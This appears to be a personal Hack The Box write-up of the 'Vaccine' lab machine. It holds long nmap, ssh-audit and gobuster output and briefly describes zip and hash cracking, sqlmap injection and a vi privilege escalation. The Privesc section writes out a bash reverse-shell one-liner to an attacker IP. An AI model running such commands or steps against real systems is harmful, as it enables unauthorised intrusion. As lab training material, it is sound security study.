---
id: HTB_Vaccine
aliases: []
tags: []
---

# Vaccine

# Enumeration

## Nmap

```
# Nmap 7.94SVN scan initiated Fri Mar  8 17:44:54 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/_quick_tcp_nmap.txt -oX /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/xml/_quick_tcp_nmap.xml 10.129.120.181
Increasing send delay for 10.129.120.181 from 0 to 5 due to 121 out of 302 dropped probes since last increase.
Increasing send delay for 10.129.120.181 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
Nmap scan report for 10.129.120.181
Host is up, received user-set (0.11s latency).
Scanned at 2024-03-08 17:44:55 MST for 38s
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.126
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW12OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=
|   256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 17:45:33 2024 -- 1 IP address (1 host up) scanned in 38.54 seconds
```

## Rustscan

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.129.120.181:21
Open 10.129.120.181:22
Open 10.129.120.181:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 17:47 MST
Initiating Ping Scan at 17:47
Scanning 10.129.120.181 [2 ports]
Completed Ping Scan at 17:47, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:47
Completed Parallel DNS resolution of 1 host. at 17:47, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:47
Scanning 10.129.120.181 [3 ports]
Discovered open port 21/tcp on 10.129.120.181
Discovered open port 22/tcp on 10.129.120.181
Discovered open port 80/tcp on 10.129.120.181
Completed Connect Scan at 17:47, 0.11s elapsed (3 total ports)
Nmap scan report for 10.129.120.181
Host is up, received conn-refused (0.11s latency).
Scanned at 2024-03-08 17:47:52 MST for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

```

## 21 - FTP

### nmap

```
# Nmap 7.94SVN scan initiated Fri Mar  8 17:45:33 2024 as: nmap -vv --reason -Pn -T4 -sV -p 21 "--script=banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/tcp21/tcp_21_ftp_nmap.txt -oX /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/tcp21/xml/tcp_21_ftp_nmap.xml 10.129.120.181
Nmap scan report for 10.129.120.181
Host is up, received user-set (0.12s latency).
Scanned at 2024-03-08 17:45:34 MST for 2s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.126
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_banner: 220 (vsFTPd 3.0.3)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 17:45:36 2024 -- 1 IP address (1 host up) scanned in 2.55 seconds
```

## 22 - ssh

### ssh-audit

```
# general
(gen) banner: SSH-2.0-OpenSSH_8.0p1 Ubuntu-6ubuntu0.1
(gen) software: OpenSSH 8.0p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
(gen) compression: enabled (zlib@openssh.com)

# security
(cve) CVE-2021-41617                        -- (CVSSv2: 7.0) privilege escalation via supplemental groups
(cve) CVE-2020-15778                        -- (CVSSv2: 7.8) command injection via anomalous argument transfers
(cve) CVE-2019-16905                        -- (CVSSv2: 7.8) memory corruption and local code execution via pre-authentication integer overflow
(cve) CVE-2016-20012                        -- (CVSSv2: 5.3) enumerate usernames via challenge response

# key exchange algorithms
(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76
                                            `- [info] default key exchange since OpenSSH 6.4
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.4, Dropbear SSH 2013.62
                                            `- [info] default key exchange since OpenSSH 6.4
(kex) ecdh-sha2-nistp256                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256 (3072-bit) -- [info] available since OpenSSH 4.4
                                                      `- [info] OpenSSH's GEX fallback mechanism was triggered during testing. Very old SSH clients will still be able to create connections using a 2048-bit modulus, though modern clients will use 3072. This can only be disabled by recompiling the code (see https://github.com/openssh/openssh-portable/blob/V_9_4/dh.c#L477).
(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group14-sha256         -- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
                                            `- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group14-sha1           -- [fail] using broken SHA-1 hash algorithm
                                            `- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
                                            `- [info] available since OpenSSH 3.9, Dropbear SSH 0.53

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) ssh-rsa (3072-bit)                    -- [fail] using broken SHA-1 hash algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] deprecated in OpenSSH 8.8: https://www.openssh.com/txt/release-8.8
(key) ecdsa-sha2-nistp256                   -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5

# encryption algorithms (ciphers)
(enc) chacha20-poly1305@openssh.com         -- [warn] vulnerable to the Terrapin attack (CVE-2023-48795), allowing message prefix truncation
                                            `- [info] available since OpenSSH 6.5
                                            `- [info] default cipher since OpenSSH 6.9
(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes192-ctr                            -- [info] available since OpenSSH 3.7
(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2

# message authentication code algorithms
(mac) umac-64-etm@openssh.com               -- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 6.2
(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha1-etm@openssh.com             -- [fail] using broken SHA-1 hash algorithm
                                            `- [info] available since OpenSSH 6.2
(mac) umac-64@openssh.com                   -- [warn] using encrypt-and-MAC mode
                                            `- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 4.7
(mac) umac-128@openssh.com                  -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha2-512                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha1                             -- [fail] using broken SHA-1 hash algorithm
                                            `- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 2.1.0, Dropbear SSH 0.28

# fingerprints
(fin) ssh-ed25519: SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo
(fin) ssh-rsa: SHA256:s3wGZ0xe1yD/ubOpYQFUUbIVfMl74kh1+WiHZIEwnoA

# algorithm recommendations (for OpenSSH 8.0)
(rec) -diffie-hellman-group14-sha1          -- kex algorithm to remove
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove
(rec) -hmac-sha1                            -- mac algorithm to remove
(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove
(rec) -ssh-rsa                              -- key algorithm to remove
(rec) -chacha20-poly1305@openssh.com        -- enc algorithm to remove
(rec) -diffie-hellman-group14-sha256        -- kex algorithm to remove
(rec) -hmac-sha2-256                        -- mac algorithm to remove
(rec) -hmac-sha2-512                        -- mac algorithm to remove
(rec) -umac-128@openssh.com                 -- mac algorithm to remove
(rec) -umac-64-etm@openssh.com              -- mac algorithm to remove
(rec) -umac-64@openssh.com                  -- mac algorithm to remove

# additional info
(nfo) For hardening guides on common OSes, please see: <https://www.ssh-audit.com/hardening_guides.html>
```

### nmap

```
# Nmap 7.94SVN scan initiated Fri Mar  8 17:45:33 2024 as: nmap -vv --reason -Pn -T4 -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/tcp22/tcp_22_ssh_nmap.txt -oX /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/tcp22/xml/tcp_22_ssh_nmap.xml 10.129.120.181
Nmap scan report for 10.129.120.181
Host is up, received user-set (0.12s latency).
Scanned at 2024-03-08 17:45:34 MST for 3s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
|_banner: SSH-2.0-OpenSSH_8.0p1 Ubuntu-6ubuntu0.1
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW12OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=
|   256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW
| ssh2-enum-algos:
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 17:45:37 2024 -- 1 IP address (1 host up) scanned in 4.21 seconds
```
## 80 - http
### nmap

```
# Nmap 7.94SVN scan initiated Fri Mar  8 17:45:33 2024 as: nmap -vv --reason -Pn -T4 -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/tcp80/tcp_80_http_nmap.txt -oX /home/kali/dev/Vaccine/enum/results/10.129.120.181/scans/tcp80/xml/tcp_80_http_nmap.xml 10.129.120.181
Nmap scan report for 10.129.120.181
Host is up, received user-set (0.12s latency).
Scanned at 2024-03-08 17:45:34 MST for 40s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-useragent-tester:
|   Status for browser useragent: 200
|   Allowed User Agents:
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
| http-auth-finder:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.120.181
|   url                        method
|_  http://10.129.120.181:80/  FORM
|_http-malware-host: Host appears to be clean
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.120.181
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.129.120.181:80/
|     Form id: login__username
|_    Form action:
|_http-chrono: Request times for /; avg: 362.11ms; min: 339.33ms; max: 396.77ms
|_http-date: Sat, 09 Mar 2024 00:45:48 GMT; -1s from local time.
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
| http-vhosts:
| xml
| dhcp
| news
| f5
| mgmt
| citrix
|_122 names had status 200
|_http-referer-checker: Couldn't find any cross-domain scripts.
| http-headers:
|   Date: Sat, 09 Mar 2024 00:45:47 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Set-Cookie: PHPSESSID=kuig9evvcp5jqeb4pejov31vm4; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|
|_  (Request type: HEAD)
| http-sitemap-generator:
|   Directory structure:
|     /
|       Other: 1; css: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; css: 1
| http-php-version: Logo query returned unknown hash 7fc57ec27ad8a997dfd15e4f4313558d
|_Credits query returned unknown hash 7fc57ec27ad8a997dfd15e4f4313558d
| http-security-headers:
|   Cache_Control:
|     Header: Cache-Control: no-store, no-cache, must-revalidate
|   Pragma:
|     Header: Pragma: no-cache
|   Expires:
|_    Header: Expires: Thu, 19 Nov 1981 08:52:00 GMT
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-title: MegaCorp Login
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-comments-displayer:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.120.181
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 44
|     Comment:
|         /* helpers/icon.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 1
|     Comment:
|         /* config.css */
|
|     Path: http://10.129.120.181:80/
|     Line number: 11
|     Comment:
|         <!-- partial:index.partial.html -->
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 194
|     Comment:
|         /* modules/text.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 3
|     Comment:
|         /* helpers/align.css */
|
|     Path: http://10.129.120.181:80/
|     Line number: 40
|     Comment:
|         <!-- partial -->
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 31
|     Comment:
|         /* helpers/hidden.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 143
|     Comment:
|         /* modules/login.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 100
|     Comment:
|         /* modules/form.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 87
|     Comment:
|         /* modules/anchor.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 21
|     Comment:
|         /* helpers/grid.css */
|
|     Path: http://10.129.120.181:80/style.css
|     Line number: 60
|     Comment:
|_        /* layout/base.css */
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-feed: Couldn't find any feeds.
|_http-mobileversion-checker: No mobile version detected.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-errors: Couldn't find any error pages.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 17:46:14 2024 -- 1 IP address (1 host up) scanned in 41.32 seconds
```

### gobuster

```
http://10.129.120.181:80/.hta                 (Status: 403) [Size: 279]
http://10.129.120.181:80/.hta.aspx            (Status: 403) [Size: 279]
http://10.129.120.181:80/.hta.asp             (Status: 403) [Size: 279]
http://10.129.120.181:80/.hta.txt             (Status: 403) [Size: 279]
http://10.129.120.181:80/.hta.jsp             (Status: 403) [Size: 279]
http://10.129.120.181:80/.hta.html            (Status: 403) [Size: 279]
http://10.129.120.181:80/.hta.php             (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess            (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess.html       (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess.php        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess.asp        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess.jsp        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess.txt        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htaccess.aspx       (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd            (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd.html       (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd.php        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd.asp        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd.aspx       (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd.jsp        (Status: 403) [Size: 279]
http://10.129.120.181:80/.htpasswd.txt        (Status: 403) [Size: 279]
http://10.129.120.181:80/dashboard.php        (Status: 200) [Size: 2312]
http://10.129.120.181:80/index.php            (Status: 200) [Size: 2312]
http://10.129.120.181:80/license.txt          (Status: 200) [Size: 1100]
http://10.129.120.181:80/server-status        (Status: 403) [Size: 279]
```

### curl

```
HTTP/1.1 200 OK
Date: Sat, 09 Mar 2024 00:45:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=n52muni25dne1vs7g2bbdau4i9; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2312
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->

</body>
</html>

```

# Exploration

HTB kinda leads you to using John to break the zip password file, going to do that

![htb_vaccine_exploring.png](assets/imgs/htb_vaccine_exploring.png)

Now that it is converted to a hash, lets crack it

![htb_vaccine_hash01.png](assets/imgs/htb_vaccine_hash01.png)

ok, now that we are the zip we find a hash in index.php

![htb_vaccine_html.png](assets/imgs/htb_vaccine_html.png)

Now to crack that

![htb_vaccine_hash02.png](assets/imgs/htb_vaccine_hash02.png)

Ok, now we have an admin pwd for the web portal

![htb_vaccine_webadmin.png](assets/imgs/htb_vaccine_webadmin.png)

Some sort of searching thing, htb asks for sqlmap stuff so lets use that
Something notable is that you have to use the session cookie from the browser in order to access the vulnerable form.

![htb_vaccine_shell.png](assets/imgs/htb_vaccine_shell.png)

:)

Now that we have a shell, lets do some privesc?

# Privesc

For reference, this is a quick bash rev shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.15.126/1337 0>&1"
```

User flag: ec9b13ca4d6229cd5cc1e09980965bf7

found the postgres user pw in the plaintext website files

![htb_vaccine_privesc.png](assets/imgs/htb_vaccine_privesc.png)

There is a vulnerability inside the ability to execute vi, you can privesc by spawning a shell whithin vi, then from there executing it again witht the file that allows the user to suid as root, then again spawn a shell.

![htb_vaccine_pwned.png](assets/imgs/htb_vaccine_pwned.png)

:)

Vaccine has been pwned.
